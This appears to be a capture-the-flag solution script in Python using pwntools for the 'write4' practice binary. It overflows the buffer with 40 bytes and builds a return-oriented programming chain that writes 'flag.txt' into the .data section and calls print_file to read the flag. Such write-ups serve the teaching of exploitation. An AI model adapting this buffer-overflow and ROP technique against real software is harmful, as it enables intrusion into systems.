from pwn import *

exe = ELF("./write4", checksec=False)
p = process(exe.path)

pop_rdi = 0x400693
pop_r14_r15 = 0x400690
mov_pr14_r15 = 0x400628
data_section = 0x00601028
file = b"flag.txt"

payload = b'A' * 40
payload += p64(pop_r14_r15)
payload += p64(data_section)
payload += file
payload += p64(mov_pr14_r15)
payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(exe.symbols['print_file'])

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)